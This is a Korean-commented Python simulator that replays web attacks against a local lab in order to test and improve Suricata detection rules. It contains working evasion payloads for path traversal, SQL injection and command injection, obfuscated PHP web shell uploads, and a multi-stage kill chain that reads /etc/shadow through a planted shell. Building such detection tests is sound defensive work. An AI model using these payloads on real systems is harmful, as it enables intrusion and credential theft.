#!/usr/bin/env python3
# ──────────────────────────────────────────────────────────────────────────────
# AI-SOC 공격 시나리오 시뮬레이터 (탐지 룰 고도화용)
#
# 목적: 단순 공격이 아니라 "우회(evasion) 변형"과 "다단계 킬체인"을 재생해서
#       (1) 현재 룰의 탐지 사각지대를 찾고 (2) 룰 고도화 전/후를 비교하고
#       (3) LLM이 공격 스토리를 복원하도록 상관 가능한 타임라인을 만든다.
#
# 대상: 반드시 본인이 구축한 로컬 랩(docker) 에게만 사용. 기본 localhost:8080.
# 특징: requests가 URL을 정규화/재인코딩하는 문제를 피하려고 raw socket으로
#       HTTP 요청 바이트를 그대로 전송한다 (이중 인코딩 등 정확한 검증에 필수).
#
# 사용법:
#   python attack_scenarios.py --mode all
#   python attack_scenarios.py --mode path        # 경로 조작 우회만
#   python attack_scenarios.py --mode killchain   # 킬체인 시나리오만
#   python attack_scenarios.py --target localhost:8080 --delay 1.5
# ──────────────────────────────────────────────────────────────────────────────

import socket
import time
import argparse

# 각 페이로드에 라벨을 붙인다:
#   [BASE]    = 순진한 공격, 현재 룰이 잡아야 정상
#   [EVASION] = 우회 변형, 현재 룰이 놓칠 수 있는 것 (= 고도화 대상)
BASE = "BASE   "
EVAS = "EVASION"


def send_raw(host, port, raw_bytes, label):
    """raw socket으로 HTTP 요청 바이트를 그대로 전송."""
    try:
        s = socket.create_connection((host, port), timeout=5)
        s.sendall(raw_bytes)
        s.settimeout(2)
        try:
            resp = s.recv(200)
        except socket.timeout:
            resp = b""
        s.close()
        status = resp.split(b"\r\n")[0].decode("latin-1", "ignore") if resp else "(no resp)"
        print(f"    [{label}] {status}")
    except Exception as e:
        print(f"    [{label}] ERROR: {e}")


def build_get(host, path, headers=None):
    lines = [f"GET {path} HTTP/1.1", f"Host: {host}", "Connection: close"]
    if headers:
        lines += [f"{k}: {v}" for k, v in headers.items()]
    return ("\r\n".join(lines) + "\r\n\r\n").encode("latin-1")


def build_post(host, path, body, headers=None):
    hdrs = {"Content-Type": "application/x-www-form-urlencoded",
            "Content-Length": str(len(body))}
    if headers:
        hdrs.update(headers)
    lines = [f"POST {path} HTTP/1.1", f"Host: {host}", "Connection: close"]
    lines += [f"{k}: {v}" for k, v in hdrs.items()]
    return ("\r\n".join(lines) + "\r\n\r\n" + body).encode("latin-1")


# ──────────────────────────────────────────────────────────────────────────────
# [1] Path Traversal — 인코딩 우회 계층
#     현재 룰(1000001)은 http.uri에 리터럴 ".."(content:"..")를 요구한다.
#     Suricata가 http.uri를 1회 정규화하므로, 단일 인코딩은 대부분 잡히지만
#     '이중 인코딩'과 '오버롱 UTF-8'은 리터럴 ".."가 복원되지 않아 뚫릴 수 있다.
# ──────────────────────────────────────────────────────────────────────────────
def scenario_path(host, port, delay):
    print("\n[1] PATH TRAVERSAL — 인코딩 우회 (target rule 1000001)")
    cases = [
        (BASE, "/?x=../../../../etc/passwd"),
        (BASE, "/?x=%2e%2e%2f%2e%2e%2fetc%2fpasswd"),          # 단일 인코딩(보통 정규화로 잡힘)
        (EVAS, "/?x=%252e%252e%252f%252e%252e%252fetc%252fpasswd"),  # 이중 인코딩
        (EVAS, "/?x=%c0%ae%c0%ae%2f%c0%ae%c0%ae%2fetc%2fpasswd"),    # 오버롱 UTF-8
        (EVAS, "/?x=..%c1%9c..%c1%9cetc/passwd"),               # 변형 유니코드 슬래시
        (EVAS, "/?x=%%32%65%%32%65/etc/passwd"),                # 중첩 퍼센트
    ]
    for label, path in cases:
        send_raw(host, port, build_get(host, path), label)
        time.sleep(delay)


# ──────────────────────────────────────────────────────────────────────────────
# [2] SQL Injection — 공백/주석 우회
#     현재 룰(1000003) pcre는 union\s+select 처럼 \s(공백류)만 매칭.
#     인라인 주석 /**/ 은 공백이 아니므로 union/**/select 로 우회 가능.
# ──────────────────────────────────────────────────────────────────────────────
def scenario_sqli(host, port, delay):
    print("\n[2] SQL INJECTION — 공백/주석 우회 (target rule 1000003)")
    cases = [
        (BASE, "/?id=1%20union%20select%20pass%20from%20users"),
        (EVAS, "/?id=1%20union/**/select%20pass%20from%20users"),   # 인라인 주석
        (EVAS, "/?id=1/**/UnIoN/**/SeLeCt/**/1"),                    # 주석+대소문자
        (EVAS, "/?id=1%0aunion%0aselect%0a1"),                       # 개행 치환
        (EVAS, "/?id=1%09union%09select%091"),                       # 탭 치환
    ]
    for label, path in cases:
        send_raw(host, port, build_get(host, path), label)
        time.sleep(delay)


# ──────────────────────────────────────────────────────────────────────────────
# [3] OS Command Injection — 문자열 분할 우회
#     현재 룰(1000004)은 구분자 뒤에 리터럴 명령어(cat|whoami|...)를 요구.
#     따옴표/변수확장으로 명령어 이름을 쪼개면 리터럴 매칭이 깨진다.
# ──────────────────────────────────────────────────────────────────────────────
def scenario_cmd(host, port, delay):
    print("\n[3] COMMAND INJECTION — 문자열 분할 우회 (target rule 1000004)")
    cases = [
        (BASE, "/?cmd=;whoami"),
        (EVAS, "/?cmd=;w'h'o'a'mi"),               # 따옴표 삽입
        (EVAS, "/?cmd=;wh%22%22oami"),             # 빈 문자열 연결
        (EVAS, "/?cmd=;cat$IFS/etc/passwd"),       # IFS 변수 (cat 리터럴 유지 → 탐지됨)
        (EVAS, "/?cmd=%60whoami%60"),              # 백틱
    ]
    for label, path in cases:
        send_raw(host, port, build_get(host, path), label)
        time.sleep(delay)


# ──────────────────────────────────────────────────────────────────────────────
# [4] 페이로드 위치 우회
#     현재 웹 룰들은 http.uri / http.request_body / http.user_agent만 검사.
#     동일 공격을 Referer, Cookie 등 다른 헤더에 실으면 놓칠 수 있다.
# ──────────────────────────────────────────────────────────────────────────────
def scenario_location(host, port, delay):
    print("\n[4] PAYLOAD 위치 우회 — 헤더/쿠키에 은닉 (룰의 검사 버퍼 사각지대)")
    sqli = "1 union select pass from users"
    cases = [
        (BASE, build_get(host, "/?id=1%20union%20select%20pass",)),
        (EVAS, build_get(host, "/", {"Referer": sqli})),        # Referer 헤더
        (EVAS, build_get(host, "/", {"Cookie": f"sid={sqli}"})),  # Cookie
        (EVAS, build_get(host, "/", {"X-Forwarded-For": "../../etc/passwd"})),
    ]
    for label, raw in cases:
        send_raw(host, port, raw, label)
        time.sleep(delay)


# ──────────────────────────────────────────────────────────────────────────────
# [5] 다단계 킬체인 시나리오 (실전형 침해 흐름)
#     정찰 → 탐침 → 침투 → 실행 → 지속성 → 장악·유출을 하나의 공격자 세션으로 연결.
#     - 각 단계 다중 요청(실제 도구 행위 모사)
#     - 우회 인코딩 페이로드 사용(고도화된 룰이 체인 안에서 탐지됨을 증명)
#     - 세션 쿠키/User-Agent 연속성으로 단일 공격자 지문 형성
#     - 지터(jitter) 타이밍 + MITRE ATT&CK 전술 매핑
# ──────────────────────────────────────────────────────────────────────────────
def scenario_killchain(host, port, delay):
    import random
    print("\n[5] MULTI-STAGE KILL CHAIN  — 실전형 침해 흐름")

    # 단일 공격자 지문: 세션 쿠키 + 진화하는 User-Agent
    sid = "".join(random.choice("abcdef0123456789") for _ in range(16))
    UA_SCAN = "Mozilla/5.0 (compatible; Nuclei - Open-source vulnerability scanner)"
    UA_BLEND = ("Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                "(KHTML, like Gecko) Chrome/124.0 Safari/537.36")  # 정찰 후 정상 사용자로 위장
    UA_TOOL = "Mozilla/5.0 (Windows NT; WindowsPowerShell/5.1.19041)"

    def hit(path, ua, method="GET", body=None, note=""):
        hdrs = {"User-Agent": ua, "Cookie": f"PHPSESSID={sid}"}
        if method == "POST":
            raw = build_post(host, path, body, hdrs)
        else:
            raw = build_get(host, path, hdrs)
        send_raw(host, port, raw, BASE)
        time.sleep(delay + random.uniform(0.4, 0.8))  # 지터

    # ── Stage 1 · 정찰 (TA0043 Reconnaissance) ──
    print("  Stage 1 · 정찰: 자동화 스캐너로 민감 경로 대량 탐색")
    for path in ["/admin", "/.env", "/.git/config", "/phpmyadmin/",
                 "/wp-login.php", "/backup.zip", "/server-status", "/robots.txt"]:
        hit(path, UA_SCAN)

    # ── Stage 2 · 취약점 탐침 (TA0007 Discovery) ── 우회 인코딩 사용
    print("  Stage 2 · 탐침: 경로조작 취약점 확인 (인코딩 우회)")
    hit("/?file=%252e%252e%252f%252e%252e%252fetc%252fpasswd", UA_BLEND)   # 이중 인코딩
    hit("/?page=%c0%ae%c0%ae%2fetc%2fpasswd", UA_BLEND)                    # 오버롱 UTF-8

    # ── Stage 3 · 초기 침투 (TA0001 Initial Access) ── SQLi 인증우회+추출, 주석 우회
    print("  Stage 3 · 침투: SQL 인젝션 인증우회 및 계정정보 추출")
    hit("/login?user=admin'--+-&pass=x", UA_BLEND)
    hit("/?id=1/**/union/**/select/**/username,password/**/from/**/users", UA_BLEND)

    # ── Stage 4 · 실행 (TA0002 Execution) ── 커맨드 인젝션 시스템 열거, 분할 우회
    print("  Stage 4 · 실행: 원격 명령으로 시스템 정보 열거")
    hit("/?cmd=;w'h'oami", UA_BLEND)                    # 따옴표 분할 우회
    hit("/?cmd=;cat$IFS/etc/passwd", UA_BLEND)
    hit("/?exec=%7c%20id%3b%20uname%20-a", UA_BLEND)    # | id; uname -a

    # ── Stage 5 · 지속성 (TA0003 Persistence) ── 난독화 웹셸 업로드
    print("  Stage 5 · 지속성: 은닉 난독화 웹셸 업로드 (China Chopper)")
    hit("/uploads/.sess_cache.php", UA_BLEND, method="POST",
        body="<?php @eval($_POST['x']); ?>")

    # ── Stage 6 · 장악 & 유출 (TA0011 C2 / TA0010 Exfiltration) ──
    print("  Stage 6 · 장악·유출: 웹셸 명령실행 후 데이터 반출")
    hit("/uploads/.sess_cache.php?x=whoami", UA_TOOL)          # 웹셸 접근
    hit("/uploads/.sess_cache.php?x=cat+/etc/shadow", UA_TOOL) # 민감정보 조회
    hit("/exfil?data=../../../../etc/passwd", UA_TOOL)         # 데이터 반출 시도

    print("  → 킬체인 완료. 6단계가 하나의 공격자 세션(동일 쿠키)으로 이어진 "
          "타임라인이 생성됨. 대시보드 확인.")


# ──────────────────────────────────────────────────────────────────────────────
# [6] 웹셸 업로드 (target rule 1000005) — POST 본문 검사
#     주의: 페이로드가 본문에 있어 eve.json의 url 필드로는 확인 불가.
#     검증하려면 suricata.yaml의 payload-printable: yes 가 켜져 있어야 한다.
#     현재 최소 설정 환경에서는 "탐지 건수"로만 확인 가능.
# ──────────────────────────────────────────────────────────────────────────────
def scenario_webshell_upload(host, port, delay):
    print("\n[6] WEB SHELL UPLOAD — 난독화 변형 (target rule 1000005)")
    cases = [
        (BASE, "<?php system($_GET['c']); ?>"),
        (EVAS, "<?php @eval($_POST['pass']);?>"),                # China Chopper
        (EVAS, "<?=`$_GET[0]`?>"),                               # 짧은 태그+백틱
        (EVAS, "<?php $f='sys'.'tem'; $f($_GET['c']); ?>"),      # 문자열 연결
        (EVAS, "<?php eval(base64_decode('c3lzdGVtKCk7')); ?>"), # base64
        (EVAS, "<?php $_='ass'.'ert'; $_($_POST['a']); ?>"),     # assert 분할
    ]
    for label, body in cases:
        send_raw(host, port, build_post(host, "/upload.php", body), label)
        time.sleep(delay)


# ──────────────────────────────────────────────────────────────────────────────
# [7] 알려진 웹셸 파일명 접근 (target rule 1000006) — URL 기반, 검증 가능
# ──────────────────────────────────────────────────────────────────────────────
def scenario_webshell_name(host, port, delay):
    print("\n[7] KNOWN WEB SHELL FILENAME ACCESS (target rule 1000006)")
    cases = [
        (BASE, "/uploads/c99.php"),
        (BASE, "/shell.jsp"),
        (BASE, "/images/wso.aspx"),
        (BASE, "/b374k.php"),
        (BASE, "/backdoor.asp"),
        (EVAS, "/uploads/c99.php7"),       # 알려진 웹셸명 + 새 확장자
        (EVAS, "/wso.phtml"),              # 알려진 웹셸명 + phtml
        (EVAS, "/shell.php.jpg"),          # 알려진 웹셸명 + 이중 확장자
    ]
    for label, path in cases:
        send_raw(host, port, build_get(host, path), label)
        time.sleep(delay)


def main():
    parser = argparse.ArgumentParser(description="AI-SOC 공격 시나리오 시뮬레이터 (로컬 랩 전용)")
    parser.add_argument("--target", default="localhost:8080", help="대상 host:port")
    parser.add_argument("--mode", default="all",
                        choices=["all", "path", "sqli", "cmd", "location",
                                 "webshell", "webshellname", "killchain"])
    parser.add_argument("--delay", type=float, default=0.8, help="요청 간 대기(초)")
    args = parser.parse_args()

    host, _, port_s = args.target.partition(":")
    port = int(port_s) if port_s else 80

    print("=" * 70)
    print(f"  대상: {host}:{port}   모드: {args.mode}")
    print("  ⚠️  본인이 구축한 로컬 랩 환경에만 사용하세요.")
    print("=" * 70)

    runners = {
        "path": scenario_path, "sqli": scenario_sqli, "cmd": scenario_cmd,
        "location": scenario_location, "webshell": scenario_webshell_upload,
        "webshellname": scenario_webshell_name, "killchain": scenario_killchain,
    }
    if args.mode == "all":
        for name in ["path", "sqli", "cmd", "location",
                     "webshell", "webshellname", "killchain"]:
            runners[name](host, port, args.delay)
    else:
        runners[args.mode](host, port, args.delay)

    print("\n완료. eve.json에서 시그니처별 건수를 확인하세요.")


if __name__ == "__main__":
    main()